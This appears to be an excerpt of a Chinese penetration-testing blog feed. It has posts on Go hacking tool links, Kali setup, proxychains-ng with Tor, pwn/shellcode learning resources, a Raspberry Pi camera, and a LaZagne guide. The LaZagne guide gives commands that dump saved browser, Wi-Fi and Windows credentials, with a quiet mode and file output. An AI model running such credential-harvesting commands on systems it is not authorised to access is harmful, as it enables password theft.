<h3 id="Hacking-with-Go-基于Gray-Black-Hat-Python-C-系列书籍"><a href="#Hacking-with-Go-基于Gray-Black-Hat-Python-C-系列书籍" class="headerlink" title="Hacking-with-Go(基于Gray/Black-Hat-Python/C#系列书籍)"></a>Hacking-with-Go(基于Gray/Black-Hat-Python/C#系列书籍)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9IYWNraW5nLXdpdGgtR28=">Hacking-with-Go<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="goHackTools-基于各种hack书籍的go-hack资源-俄罗斯hacker的go源码"><a href="#goHackTools-基于各种hack书籍的go-hack资源-俄罗斯hacker的go源码" class="headerlink" title="goHackTools(基于各种hack书籍的go-hack资源-俄罗斯hacker的go源码)"></a>goHackTools(基于各种hack书籍的go-hack资源-俄罗斯hacker的go源码)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb0hhY2tUb29scw==">goHackTools<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h4 id="QQ-OR-微信"><a href="#QQ-OR-微信" class="headerlink" title="QQ OR 微信"></a>QQ OR 微信</h4><ul>
<li>1185151867</li>
<li>By Lucifer11 :)</li>
<li>Happy hacking!</li>
</ul>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>penetration tools</tag>
      </tags>
  </entry>
  <entry>
    <title>kali-linux-2019.4设置中文字体</title>
    <url>/2019/12/04/kali-screen-shot/</url>
    <content><![CDATA[<p>最近Kali linux更新到了2019.4版本，下载下来发现找不到设置中文的选项，经过在网上搜索一番发现一个开源的汉语字体包：文泉驿字体</p>
<p>在终端中输入以下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install ttf-wqy-microhei ttf-wqy-zenhei xfonts-wqy</span><br></pre></td></tr></table></figure>

<p>安装完成后，重启系统就会变成中文的系统啦</p>
<a id="more"></a>

<p>下边附上我更改为中文后的kali系统</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/kaliscreen.jpg"></p>
<p>下面再推荐一款kali下好用的截屏品工具:</p>
<p>kali 截图工具Scrot的安装及使用:</p>
<p>安装之前确认/etc/apt/sources.list源配好：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install scrot</span><br></pre></td></tr></table></figure>

<p>使用方式：</p>
<ul>
<li>1.截取整个桌面</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scrot</span><br></pre></td></tr></table></figure>

<ul>
<li>2.指定保存目标文件夹和截图文件名(默认保存当前目录下)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scrot /root/Pictures/1.png</span><br></pre></td></tr></table></figure>

<ul>
<li>3.截取特定窗口或矩形区域</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scrot -s</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>kali配置</category>
      </categories>
      <tags>
        <tag>kali linux 2019.4</tag>
      </tags>
  </entry>
  <entry>
    <title>LaZagne---全平台多功能密码恢复工具</title>
    <url>/2019/12/03/password-stealer/</url>
    <content><![CDATA[<p>LaZagne项目是AlessandroZ大佬的，<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsZXNzYW5kcm9aL0xhWmFnbmU=">github项目地址<i class="fa fa-external-link-alt"></i></span></p>
<p>LaZagne项目是一个开源应用程序，用于检索大量存储在本地计算机上的密码。 每个软件都使用不同的技术（纯文本，API，自定义算法，数据库等）存储其密码。 开发该工具的目的是为最常用的软件找到这些密码。</p>
<p>LaZagne共支持恢复chats,mails,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php等等14项密码，具体如下图所示。</p>
<a id="more"></a>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/lazagne.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/lazagne1.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/lazagne2.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/lazagne3.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/lazagne4.jpg"></p>
<ul>
<li>启动所有模块</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne.exe all</span><br></pre></td></tr></table></figure>

<ul>
<li>仅启动特定模块</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne.exe browsers</span><br></pre></td></tr></table></figure>

<ul>
<li>仅启动特定的软件脚本</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne.exe browsers -firefox</span><br></pre></td></tr></table></figure>

<ul>
<li>将找到的所有密码写到文件中（对于普通txt，为-oN，对于Json为-oJ，对于所有为-oA）。 注意：如果您在解析以多行字符串形式编写的JSON结果时遇到问题，请选中此复选框。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne.exe browsers -firefoxlaZagne.exe all -oN</span><br><span class="line">laZagne.exe all -oA -output C:\Users\<span class="built_in">test</span>\Desktop</span><br></pre></td></tr></table></figure>

<ul>
<li>帮助</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne.exe -h</span><br><span class="line">laZagne.exe browsers -h</span><br></pre></td></tr></table></figure>

<ul>
<li>更改详细输出模式(2个不同级别)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne.exe all -vv</span><br></pre></td></tr></table></figure>

<ul>
<li>安静模式（标准输出上不会打印任何内容）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne.exe all -quiet -oA</span><br></pre></td></tr></table></figure>

<ul>
<li>要解密域凭据，可以通过指定用户Windows密码来完成。 否则，它将尝试将所有已找到的密码作为Windows密码使用。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne.exe all -password ZapataVive</span><br></pre></td></tr></table></figure>

<p>注意：对于wifi密码\Windows Secrets，请以管理员权限启动它（UAC身份验证/sudo)</p>
<h3 id="Mac-OS"><a href="#Mac-OS" class="headerlink" title="Mac OS"></a>Mac OS</h3><p>注意：在Mac OS系统中，如果没有用户密码，则很难检索存储在计算机上的密码。 因此，我建议使用以下选项之一</p>
<ul>
<li>如果您知道用户密码，请在命令行中添加</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne all --password SuperSecurePassword</span><br></pre></td></tr></table></figure>

<ul>
<li>您可以使用交互式模式，该模式将向用户提示对话框，直到密码正确为止</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne all -i</span><br></pre></td></tr></table></figure>

<h3 id="Supported-software"><a href="#Supported-software" class="headerlink" title="Supported software"></a>Supported software</h3><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/lazagne5.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/lazagne6.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/lazagne7.jpg"></p>
<h3 id="last"><a href="#last" class="headerlink" title="last"></a>last</h3><p>QQ:1185151867</p>
<p><font color="red">HAPPY HACKING!!!</font></p>
]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>pentest</tag>
        <tag>password recover</tag>
      </tags>
  </entry>
  <entry>
    <title>kali安装proxychains-ng(proxychains升级版)</title>
    <url>/2019/10/23/proxychains-ng/</url>
    <content><![CDATA[<p><font color="blue">今天打开kali，启动v2ray，然后proxychains代理firefox打开google,忽然发现打不开了，命令行也显示找不到DNS，网上到处乱搜也解决不了问题，最后看到了proxychains-ng(proxychains的升级版)，<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JvZmwwci9wcm94eWNoYWlucy1uZw==">github下载地址<i class="fa fa-external-link-alt"></i></span>,下面是详细安装和使用过程。</font></p>
<h3 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h3><p>　　在linux系统中有很多软件是不支持代理的，但是proxychains 却可以让不支持代理的软件</p>
<p>　　也能走代理通道，支持HTTP，HTTPS,SOCKS4,SOCKS5,等多种代理协议，而且还能配置代理链</p>
<p>　　(可以理解成多重代理)，可以说是安全渗透的神器！</p>
<a id="more"></a>

<h3 id="强加密"><a href="#强加密" class="headerlink" title="强加密"></a>强加密</h3><p>　　“强加密”代理指的是使用的一重代理，二重代理，多重代理中有一个代理是“强加密”</p>
<p>　　类型的那么该代理就是“强加密”代理。这样如果别人想要获得你的真实IP是很困难的。</p>
<p>　　Tor就属于一种“强加密”代理，但是由于国内环境我们必须要进行前置代理，</p>
<p>　　所以我选择SSR+Tor的组合。</p>
<h3 id="socks4和socks5的区别"><a href="#socks4和socks5的区别" class="headerlink" title="socks4和socks5的区别"></a>socks4和socks5的区别</h3><p>SOCKS代理与其他类型的代理不同，它只是简单地传递数据包，而并不关心是何种应用协议，既可以是HTTP请求，</p>
<p>所以SOCKS代理服务器比其他类型的代理服务器速度要快得多。</p>
<p>SOCKS代理又分为SOCKS4和SOCKS5</p>
<p>二者不同的是SOCKS4代理只支持TCP协议（即传输控制协议），而SOCKS5代理则既支持TCP协议又支持UDP协议</p>
<p>（即用户数据包协议），还支持各种身份验证机制、服务器端域名解析等。SOCK4能做到的SOCKS5都可得到，</p>
<p>但SOCKS5能够做到的SOCK4则不一定能做到，比如我们常用的聊天工具QQ在使用代理时就要求用SOCKS5代理，</p>
<p>因为它需要使用UDP协议来传输数据</p>
<h4 id="第一步：卸载原来自带的proxychains"><a href="#第一步：卸载原来自带的proxychains" class="headerlink" title="第一步：卸载原来自带的proxychains"></a>第一步：卸载原来自带的proxychains</h4><p>命令行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get autoremove proxychains</span><br></pre></td></tr></table></figure>
<p>(autoremove这样能卸载干净)<br>然后删除proxychians.conf配置文件:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm -v /etc/proxychains.conf</span><br></pre></td></tr></table></figure>

<h4 id="第二步：下载proxychains-ng，并安装"><a href="#第二步：下载proxychains-ng，并安装" class="headerlink" title="第二步：下载proxychains-ng，并安装"></a>第二步：下载proxychains-ng，并安装</h4><p>想要使用proxychains-ng首先需要在kali上配置好ssr或者v2ray的客户端，并部署和搭建好vps服务器，本人博客之前有一篇搭建ssr的文章，之后有空会写搭建v2ray的文章，文章地址<a href="https://fdlucifer.github.io/2019-02-06-ssr.html#more">国外的vps自建ssr,附带加速教程</a></p>
<p>下载和安装命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rofl0r/proxychains-ng.git</span><br><span class="line"></span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc</span><br><span class="line"></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">make install-config</span><br></pre></td></tr></table></figure>
<p>leafpad命令打开/proxychains-ng/src目录下的proxychains.conf如下图所示编辑，并添加”sock5 127.0.0.1 1080”<br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains1.jpg" alt="proxychains1"><br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains2.jpg" alt="proxychains2"><br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains3.jpg" alt="proxychains3"><br>然后将/proxychains-ng/src目录下的proxychains.conf文件复制到/etc目录下,就可以使用了。</p>
<h4 id="第三步：启用v2ray并使用proxychains-ng"><a href="#第三步：启用v2ray并使用proxychains-ng" class="headerlink" title="第三步：启用v2ray并使用proxychains-ng"></a>第三步：启用v2ray并使用proxychains-ng</h4><p>启动v2ray:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./v2ray</span><br></pre></td></tr></table></figure>
<p>然后使用proxychains4命令查看当前已经代理的ip地址:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains4 curl https://ip.cn</span><br></pre></td></tr></table></figure>
<p>如下图所示，已经成功使用vps的ip地址：<br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains4.jpg" alt="proxychains3"></p>
<p>使用proxychains命令启动firefox浏览器并打开google,youtube等网站，速度非常快</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains4 firefox google.com</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains5.jpg" alt="proxychains3"><br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains6.jpg" alt="proxychains3"></p>
<p>使用proxychains来代理nmap,sqlmap,pip等等软件都是可以的，如下几图所示：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains7.jpg" alt="proxychains3"><br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains8.jpg" alt="proxychains3"><br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains9.jpg" alt="proxychains3"></p>
<h3 id="THANKS-FOR-WATCHING"><a href="#THANKS-FOR-WATCHING" class="headerlink" title="THANKS FOR WATCHING!"></a><font color="red"><strong><em>THANKS FOR WATCHING!</em></strong></font></h3>]]></content>
      <categories>
        <category>kali下的工具使用</category>
      </categories>
      <tags>
        <tag>proxychains</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn逆向资源以及各种poc收录</title>
    <url>/2020/02/13/pwn-resources/</url>
    <content><![CDATA[<ul>
<li><p>“pwn”（pwn）-表示要危害或控制，特别是另一台计算机（服务器或PC），网站，网关设备或应用程序。它与黑客或破解（包括iOS越狱）的定义同义。—维基百科</p>
</li>
<li><p>溢出攻击的本质在于冯·诺依曼计算机模型对数据和代码没有明确区分这一先天性缺陷。因为攻击者可以将代码放置于数据区段，转而让系统去执行。</p>
</li>
</ul>
<h3 id="shell-storm"><a href="#shell-storm" class="headerlink" title="shell-storm"></a>shell-storm</h3><p><span class="exturl" data-url="aHR0cDovL3NoZWxsLXN0b3JtLm9yZy8=">shell-storm<i class="fa fa-external-link-alt"></i></span></p>
<p>各类ctf的writeup和shellcode，以及cve漏洞公开，缓冲区溢出等等。。。</p>
<a id="more"></a>

<h3 id="linux-syscall-reference"><a href="#linux-syscall-reference" class="headerlink" title="linux syscall reference"></a>linux syscall reference</h3><p><span class="exturl" data-url="aHR0cDovL3N5c2NhbGxzLmtlcm5lbGdyb2suY29tLw==">linux syscall reference<i class="fa fa-external-link-alt"></i></span></p>
<p>linux syscal各类寄存器地址核对表</p>
<h3 id="Diary-of-a-reverse-engineer"><a href="#Diary-of-a-reverse-engineer" class="headerlink" title="Diary of a reverse-engineer"></a>Diary of a reverse-engineer</h3><p><span class="exturl" data-url="aHR0cHM6Ly9kb2FyLWUuZ2l0aHViLmlvLw==">Diary of a reverse-engineer<i class="fa fa-external-link-alt"></i></span></p>
<p>逆向大牛的手稿，其中包括各类逆向工程学，缓冲区溢出，cve等等知识。。。</p>
<h3 id="ctf-wiki"><a href="#ctf-wiki" class="headerlink" title="ctf wiki"></a>ctf wiki</h3><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kv">CTF Wiki<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="PWNABLE-TW"><a href="#PWNABLE-TW" class="headerlink" title="PWNABLE.TW"></a>PWNABLE.TW</h3><p><span class="exturl" data-url="aHR0cHM6Ly9wd25hYmxlLnR3Lw==">PWNABLE.TW<i class="fa fa-external-link-alt"></i></span></p>
<p>Pwnable.tw是一个供黑客测试和扩展其二进制利用pwn技能的ctf游戏网站。</p>
<h3 id="gdb逆向调试工具"><a href="#gdb逆向调试工具" class="headerlink" title="gdb逆向调试工具"></a>gdb逆向调试工具</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B3bmRiZy9wd25kYmc=">pwndbg<i class="fa fa-external-link-alt"></i></span></p>
<p>pwndbg是一个GDB插件，它使使用GDB进行调试的工作量减少，重点放在低级软件开发人员，硬件黑客，逆向工程人员和漏洞利用开发人员所需的功能上。它具有许多功能，请参阅<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B3bmRiZy9wd25kYmcvYmxvYi9kZXYvRkVBVFVSRVMubWQ=">pwndbg FEATURES<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9Qd25nZGI=">Pwngdb<i class="fa fa-external-link-alt"></i></span></p>
<p>pwn专用gdb</p>
<h3 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h3><p><span class="exturl" data-url="aHR0cDovL3B3bmFibGUua3Iv">pwnable.kr<i class="fa fa-external-link-alt"></i></span></p>
<p>“pwnable.kr”是一个非商业性的ctf游戏网站，提供有关系统开发的各种pwn挑战。pwnable.kr的主要目的是“有趣”。请将每个挑战视为游戏。在玩pwnable.kr时，可以学习/提高系统黑客技能，但这不是唯一目的。</p>
<h3 id="ExploitBox"><a href="#ExploitBox" class="headerlink" title="ExploitBox"></a>ExploitBox</h3><p><span class="exturl" data-url="aHR0cHM6Ly9leHBsb2l0Ym94LmlvLw==">ExploitBox<i class="fa fa-external-link-alt"></i></span></p>
<p>ExploitBox是一个面向黑客，Bug猎人，研究人员和其他安全人员的游乐场和实验室。</p>
<h3 id="LEGAL-HACKERS"><a href="#LEGAL-HACKERS" class="headerlink" title="LEGAL HACKERS"></a>LEGAL HACKERS</h3><p><span class="exturl" data-url="aHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tLw==">LEGAL HACKERS<i class="fa fa-external-link-alt"></i></span></p>
<p>大神的一些漏洞poc，及其漏洞利用。。。</p>
<h3 id="将shellcode转换为汇编代码"><a href="#将shellcode转换为汇编代码" class="headerlink" title="将shellcode转换为汇编代码"></a>将shellcode转换为汇编代码</h3><p>参考<span class="exturl" data-url="aHR0cHM6Ly9odm50M3IudG9wLzIwMTgvMTAvU2hlbGwtY29kZSVFNyU5QSU4NCVFNyVCQyU5NiVFNSU4NiU5OSVFNSU5MiU4QyVFNSU4OCVBOSVFNyU5NCVBOC8=">Shell-code的编写和利用<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9ST1BnYWRnZXQ=">ROPgadget<i class="fa fa-external-link-alt"></i></span></p>
<p>使用此工具，可以在二进制文件中搜索小工具，以方便对ROP的利用。ROPgadget在x86，x64，ARM，ARM64，PowerPC，SPARC和MIPS体系结构上支持ELF/PE/Mach-O格式。从版本5开始，ROPgadget具有一个新的内核，该内核使用Capstone反汇编框架以Python形式为小工具搜索引擎编写-较旧的版本可以在Archives目录中找到，但将无法维护。</p>
<h3 id="Shellcoding-for-Linux-and-Windows-Tutorial"><a href="#Shellcoding-for-Linux-and-Windows-Tutorial" class="headerlink" title="Shellcoding for Linux and Windows Tutorial"></a>Shellcoding for Linux and Windows Tutorial</h3><p><span class="exturl" data-url="aHR0cDovL3d3dy52aXZpZG1hY2hpbmVzLmNvbS9zaGVsbGNvZGUvc2hlbGxjb2RlLmh0bWw=">Shellcoding for Linux and Windows Tutorial<i class="fa fa-external-link-alt"></i></span></p>
<p>在计算机安全性方面，从最字面意义上来说，shellcoding意味着编写代码，这些代码在执行时将返回一个远程shell。Shellcode的含义已经发展，现在代表了将插入到漏洞利用中以完成所需任务的任何字节码。</p>
<h3 id="Bypassing-non-executable-stack-during-exploitation-using-return-to-libc"><a href="#Bypassing-non-executable-stack-during-exploitation-using-return-to-libc" class="headerlink" title="Bypassing non-executable-stack during exploitation using return-to-libc"></a>Bypassing non-executable-stack during exploitation using return-to-libc</h3><p><span class="exturl" data-url="aHR0cDovL2Nzcy5jc2FpbC5taXQuZWR1LzYuODU4LzIwMTQvcmVhZGluZ3MvcmV0dXJuLXRvLWxpYmMucGRm">Bypassing non-executable-stack during exploitation using return-to-libc<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="用于X86-64的LINUX系统调用表"><a href="#用于X86-64的LINUX系统调用表" class="headerlink" title="用于X86/64的LINUX系统调用表"></a>用于X86/64的LINUX系统调用表</h3><p><span class="exturl" data-url="aHR0cDovL2Jsb2cucmNoYXBtYW4ub3JnL3Bvc3RzL0xpbnV4X1N5c3RlbV9DYWxsX1RhYmxlX2Zvcl94ODZfNjQv">用于X86/64的LINUX系统调用表<i class="fa fa-external-link-alt"></i></span></p>
<h4 id="pwn以及缓冲区溢出学习文章推荐"><a href="#pwn以及缓冲区溢出学习文章推荐" class="headerlink" title="pwn以及缓冲区溢出学习文章推荐"></a>pwn以及缓冲区溢出学习文章推荐</h4><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9iYjA4MTYyOGEwODM=">栈的缓冲区溢出详解<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2ludHJ5c2VjL3AvMTA0ODMxNTQuaHRtbA==">Linux_x86_Pwn溢出漏洞<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC80N2Q0ODRiOTIyN2U=">栈溢出攻击及防护方法简介<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC83MjQxMWQ4Y2UyYWE=">缓冲区溢出攻击<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8wMDYxMTc3ZTAzNTU=">通用shellcode的编写-调用-实验缓冲区溢出攻击-非远程-调用shellcode实例一<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC82MmVhYjU2MjA0OTA=">通用shellcode的编写-调用-实验缓冲区溢出攻击-非远程-调用shellcode实例二<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>poc</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>raspberry pi zero w 搭建移动夜视摄像头，利用手机随时监控</title>
    <url>/2018/12/06/raspberry-pi-zero-w-night-vision-camera/</url>
    <content><![CDATA[<p><font color="red"><strong>*最近闲着没事干，突发奇想，趁着刚买了pi zero，就想自己搭建个无线<br>夜视摄像头玩玩。其实这个的实用性蛮高的，可以当做夜视仪，高清延时摄影，监控，等等，超多功能。<br>*</strong></font></p>
<p><font color="blue">好了，废话不多说，下面我就来教大家如何利用现有工具，低成本搭建一<br>个可以用手机控制的高清夜视移动摄像头！</font></p>
<a id="more"></a>

<h3 id="STEP1-准备必备的硬件和物品如下图所示："><a href="#STEP1-准备必备的硬件和物品如下图所示：" class="headerlink" title="STEP1.准备必备的硬件和物品如下图所示："></a><strong><em>STEP1.</em></strong>准备必备的硬件和物品如下图所示：</h3><p><img src="/images/pi1.jpg" alt="准备硬件"></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 充电宝（供电）</li>
<li><input checked="" disabled="" type="checkbox"> 夜视摄像头</li>
<li><input checked="" disabled="" type="checkbox"> pi zero wh</li>
<li><input checked="" disabled="" type="checkbox"> sd卡及sd卡套</li>
<li><input checked="" disabled="" type="checkbox"> pi zero w摄像头排线</li>
<li><input checked="" disabled="" type="checkbox"> usb数据线</li>
</ul>
<p><strong>然后按照下图所示组装好pi zero w和摄像头</strong></p>
<p><img src="/images/pi2.jpg" alt="组装"></p>
<h3 id="STEP2-给sd卡烧写树莓派的官方系统"><a href="#STEP2-给sd卡烧写树莓派的官方系统" class="headerlink" title="STEP2.给sd卡烧写树莓派的官方系统:"></a><strong><em>STEP2.</em></strong>给sd卡烧写树莓派的官方系统:</h3><p><img src="/images/pi3.jpg" alt="烧写系统"></p>
<p><img src="/images/pi4.jpg" alt="烧写系统"></p>
<p><em>然后静静等待烧写完成即可</em></p>
<p>烧写完成后话需要按照下面几张图修改一下配置文件，不然连接不上ssh</p>
<p>首先先增加一个无后缀名的ssh文件，然后按照下面的图增加一些代码</p>
<p><img src="/images/pi14.jpg" alt="烧写系统"></p>
<p><img src="/images/pi15.jpg" alt="烧写系统"></p>
<p><img src="/images/pi16.jpg" alt="烧写系统"></p>
<h3 id="STEP3-给pi插上sd卡开机上电"><a href="#STEP3-给pi插上sd卡开机上电" class="headerlink" title="STEP3.给pi插上sd卡开机上电:"></a><strong><em>STEP3.</em></strong>给pi插上sd卡开机上电:</h3><p>首先树莓派插上电脑之前，需要确认电脑是否安装了Bonjour</p>
<p><img src="/images/pi5.jpg" alt="上电"></p>
<p>如果插上电脑，识别为串口设备，还需要安装RNDIS驱动(google搜索RNDIS驱动下载即可)</p>
<p><img src="/images/pi6.jpg" alt="上电"></p>
<p><img src="/images/pi7.jpg" alt="上电"></p>
<p>在设备管理器中更新设备驱动程序即可</p>
<p>打开xshell，照下图设置完后，弹出输入用户名和密码，用户名:pi,密码:raspberry<br>输入后登陆即可。</p>
<p><img src="/images/pi8.jpg" alt="上电"></p>
<p><img src="/images/pi9.jpg" alt="上电"></p>
<h3 id="STEP4-开启摄像头"><a href="#STEP4-开启摄像头" class="headerlink" title="STEP4.开启摄像头:"></a><strong><em>STEP4.</em></strong>开启摄像头:</h3><p>输入以下命令:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>

<p>然后输入两次你想要的root用户密码，以免以后总是要输入sudo</p>
<p>然后执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">raspi-config</span><br></pre></td></tr></table></figure>
<p><img src="/images/pi10.jpg" alt="开启"></p>
<p><img src="/images/pi11.jpg" alt="开启"></p>
<p><img src="/images/pi12.jpg" alt="开启"></p>
<p>然后重启即可</p>
<p>输入以下命令让树莓派拍一张照片以测试摄像头</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">raspistill -t 2000 -o test.jpg</span><br></pre></td></tr></table></figure>
<p>-t表示延时2000毫秒后拍摄，-o表示输出的文件名。</p>
<p>照片如下：</p>
<p><img src="/images/pi13.jpg" alt="开启"></p>
<p>当然没调焦距所以拍出来的效果不是很好啦。</p>
<h3 id="STEP5-使摄像头具有夜视和网络监控的功能"><a href="#STEP5-使摄像头具有夜视和网络监控的功能" class="headerlink" title="STEP5.使摄像头具有夜视和网络监控的功能:"></a><strong><em>STEP5.</em></strong>使摄像头具有夜视和网络监控的功能:</h3><p>前面都是配置和测试部分，现在这个就是实现夜视摄像头核心功能的部分了</p>
<p><strong>如果pi zero w连接上电脑没有网络，照下面几张图打开网络适配器，设置网络分享，然后重启即可联网</strong></p>
<p><img src="/images/pi22.jpg" alt="网络"></p>
<p><img src="/images/pi23.jpg" alt="网络"></p>
<p><img src="/images/pi24.jpg" alt="网络"></p>
<p><font color="blue"><strong><em>RPi IR-CUT Camera默认工作在常规模式。 执行命令：sudo nano /boot/config.txt，在最后一行加入disable_camera_led=1，保存并重启树莓派后Camera将工作在夜视模式。 如需恢复到常规模式，只需删除disable_camera_led=1，保存并重启树莓派即可。 如需灵活控制显示模式，可通过树莓派的GPIO接口连接到以下位置，通过改变GPIO的电平来切换不同的模式（高电平为常规模式，低电平为夜视模式）。</em></strong></font></p>
<p>这个是基于mjpg-streamer的网络监控摄像头，基于其他的网络摄像头大家可以自己上网搜索研究，这个mjpg-streamer的流畅度和性能都不错，所以本人选它。</p>
<p>以下的安装命令都是在管理员模式下进行的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install cmake libjpeg8-dev （安装所需组件和依赖）</span><br><span class="line"></span><br><span class="line">wget https://github.com/jacksonliam/mjpg-streamer/archive/master.zip（下载源码包）</span><br><span class="line"></span><br><span class="line">unzip master.zip（解压源码包）</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> mjpg-streamer-master/mjpg-streamer-experimental/plugins/input_raspicam （进入解压目录）</span><br><span class="line"></span><br><span class="line">nano input_raspicam.c （修改摄像头fps帧）</span><br></pre></td></tr></table></figure>

<p>找到下图几行设置，改为你想要的值即可:</p>
<p><img src="/images/pi17.jpg" alt="监控"></p>
<p>保存退出后，cd ../..切回根目录，输入make开始编译，</p>
<p>编译完成后输入以下命令启动mjpg-streamer</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./mjpg_streamer -i <span class="string">&quot;./input_raspicam.so&quot;</span> -o <span class="string">&quot;./output_http.so -w ./www&quot;</span></span><br></pre></td></tr></table></figure>

<p>接着在局域网电脑或者手机浏览器输入下面网址:</p>
<p><strong><em><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguNDMuMjI2OjgwODAv">http://192.168.43.226:8080/<i class="fa fa-external-link-alt"></i></span></em></strong></p>
<p><img src="/images/pi18.jpg" alt="监控"></p>
<p><img src="/images/pi19.jpg" alt="监控"></p>
<p><img src="/images/pi20.jpg" alt="监控"></p>
